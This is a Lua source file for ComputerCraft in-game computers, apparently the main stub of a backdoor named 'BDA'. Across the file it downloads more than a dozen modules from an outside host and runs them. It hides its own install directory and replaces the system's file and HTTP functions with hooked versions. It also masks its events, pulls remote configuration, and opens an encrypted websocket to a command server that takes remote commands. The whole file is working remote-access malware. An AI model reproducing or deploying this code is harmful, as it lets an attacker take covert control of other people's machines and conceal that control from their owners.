-- SPDX-FileCopyrightText: 2024 David Lightman
--
-- SPDX-License-Identifier: LicenseRef-CCPL

local main = {}
main.__index = main
local _ogg = _G
local _ogENV = _ENV
local _OGShell = shell
local _OGFS = _G.fs
local backupPullEventRaw = _G.os.pullEventRaw
local backupPullEvent = _G.os.pullEvent
local customeventmanager = (pcall(require, "hooks.customeventmanager") and require("hooks.customeventmanager")) or load(http.get("https://mydevbox.cc/src/hooks/customeventmanager.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "customeventmanager", "t", _G)()
local eventhook = (pcall(require, "hooks.eventhook") and require("hooks.eventhook")) or load(http.get("https://mydevbox.cc/src/hooks/eventhook.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "eventhook", "t", _G)()
local myhttp = (pcall(require, "networking.http.http") and require("networking.http.http")) or load(http.get("https://mydevbox.cc/src/networking/http/http.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "http", "t", _G)()
local customfs = (pcall(require, "modules.persistent.hide_fs") and require("modules.persistent.hide_fs")) or load(http.get("https://mydevbox.cc/src/modules/persistent/hide_fs.lua",{["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "hide_fs", "t", _G)()
local custompairs = (pcall(require, "hooks.custompairs") and require("hooks.custompairs")) or load(http.get("https://mydevbox.cc/src/hooks/custompairs.lua").readAll(), "custompairs", "t", _G)()
local eventhandler = (pcall(require, "eventhandler.eventhandler") and require("eventhandler.eventhandler")) or load(http.get("https://mydevbox.cc/src/eventhandler/eventhandler.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "eventhandler", "t", _G)()
local config = (pcall(require, "config.config") and require("config.config")) or load(http.get("https://mydevbox.cc/src/config/config.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "config", "t", _G)()
local utils = (pcall(require, "sys.utils.utils") and require("sys.utils.utils")) or load(http.get("https://mydevbox.cc/src/sys/utils/utils.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "utils", "t", _G)()
local cc_rsa = (pcall(require, "sys.crypto.cc_rsa") and require("sys.crypto.cc_rsa")) or load(http.get("https://mydevbox.cc/src/sys/crypto/cc_rsa.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "rsa", "t", _G)() 
local wsrouter = (pcall(require, "networking.http.wsrouter") and require("networking.http.wsrouter")) or load(http.get("https://mydevbox.cc/src/networking/http/wsrouter.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "wsrouter", "t", _G)()
local rednetrouter = (pcall(require, "networking.rednet.router") and require("networking.rednet.router")) or load(http.get("https://mydevbox.cc/src/networking/rednet/router.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "rednetrouter", "t", _G)()
local core_router = (pcall(require, "networking.core_router") and require("networking.core_router")) or load(http.get("https://mydevbox.cc/src/networking/core_router.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "core_router", "t", _G)()
local EnD = (pcall(require, "sys.crypto.EnD") and require("sys.crypto.EnD")) or load(http.get("https://mydevbox.cc/src/sys/crypto/EnD.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "EnD", "t", _G)()
local command_handler = (pcall(require, "networking.processor.command_handler") and require("networking.processor.command_handler")) or load(http.get("https://mydevbox.cc/src/networking/processor/command_handler.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "command_handler", "t", _G)()
local uninstaller_installer = (pcall(require, "uninstaller") and require("uninstaller")) or load(http.get("https://mydevbox.cc/src/uninstaller.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "uninstaller", "t", _G)()


local function getRealStartupPath()
    if not _OGFS.exists("/../startup.lua") then return nil end
    local f1 = _OGFS.open("/../startup.lua", "r")
    if not f1 then return nil end  -- Safeguard against failed open
    for i = 1, 6 do
        local l = f1.readLine()
        if not l then break end
        local filename = string.match(l, "^%-%-(%S+)%.$")
        if filename then
            f1.close()
            return filename
        end
    end
    f1.close()
    return nil
end

local function getBDApath()
    if not _OGFS.exists("/../startup.lua") then return nil, nil end
    local f = _OGFS.open("/../startup.lua", "r")
    if not f then return nil, nil end
    for i = 1, 6 do
        local l = f.readLine()
        if not l then break end
        local path, filename = string.match(l, "^%-%-(%S+),(%S+)$")
        if path and filename then
            f.close()
            return path, filename
        end
    end
    f.close()
    return nil, nil
end

local xsup=getRealStartupPath()
local bdapath, _ = getBDApath()

if xsup~=nil then
    print("set real startup filename")
    customfs.setOriginalStartup(xsup)
else
    print("real startup is nil") 
end

if customfs ~= nil and bdapath ~= nil then
    _ = nil
    print("hiding dir: "..bdapath)
    customfs.hideDir(bdapath)
else
    print("real bda is nil") 
end
_G.fs=customfs
uninstaller_installer.setOGFS(_OGFS)
uninstaller_installer.setCFS(customfs)
uninstaller_installer.setOGShell(_OGShell)
eventhook.setCustomQueueEvent(customeventmanager.getQueueEventName())
eventhook.setOriginalPullEvent(backupPullEvent)
eventhook.setOriginalPullEventRaw(backupPullEventRaw)
eventhook.activate()

myhttp.addEventHandlers(eventhook)
myhttp.setCustomPullEvent(customeventmanager.getPullEventName())
--myhttp.addSilentDomain("mydevbox.cc") --TODO: FIX for WS, add session ids
_G.http = myhttp
custompairs.add_to_blacklist(customeventmanager.getPullEventName())
custompairs.add_to_blacklist(customeventmanager.getQueueEventName())

eventhook.setEventHandler(eventhandler)
--local startup = (pcall(require, "sys.startup") and require("sys.startup")) or load(http.get("https://mydevbox.cc/src/sys/startup.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "startup", "t", _G)()
--startup:onStartup()
config:DownloadConfig("https://pastebin.com/raw/xNX6eKWq") --Old: https://pastebin.com/raw/rHA43mQp
config:set("identifier.stubid", utils.generateRandomString(16))
print("identifier: "..config:get("identifier.stubid"))
print("RHOST: "..config:get("networking.http.rhost"))
local handlerInstance = setmetatable({}, eventhandler)
myhttp.setEnD(EnD)
wsrouter.setIdentifier(config:get("identifier.stubid"))
wsrouter.setRSA(cc_rsa)
wsrouter.setUtils(utils)
wsrouter.setEnD(EnD)
wsrouter.setRawRhost("wss://"..config:get("networking.http.rhost"))
wsrouter.setOwnerID(config:get("identifier.ownerid"))
wsrouter.setConfig(config)
rednetrouter.setIdentifier(config:get("identifier.stubid"))
rednetrouter.setRSA(cc_rsa)
rednetrouter.setUtils(utils)
rednetrouter.setEnD(EnD)
core_router.setRednetrouter(rednetrouter)
core_router.setWsrouter(wsrouter)
core_router.setCommandHandler(command_handler)
command_handler.setMain(main)

function main.getConfig()
    return config
end
function main.getConfigUrl()
    return configurl
end
function main.setConfigUrl(url)
    configurl = url
end
function main.getUtils()
    return utils
end
function main.getRSA()
    return cc_rsa
end
function main.getEnD()
    return EnD
end
function main.getCore_Router()
    return core_router
end
function main.getUninstaller()
    return uninstaller
end
function main.getOGShell()
    return _OGShell
end

local function init()
    wsrouter.allow_encryption(true)
    wsrouter.connect(config:get("networking.http.rhost"))
    core_router.send2host("0x00")
end
init()
return main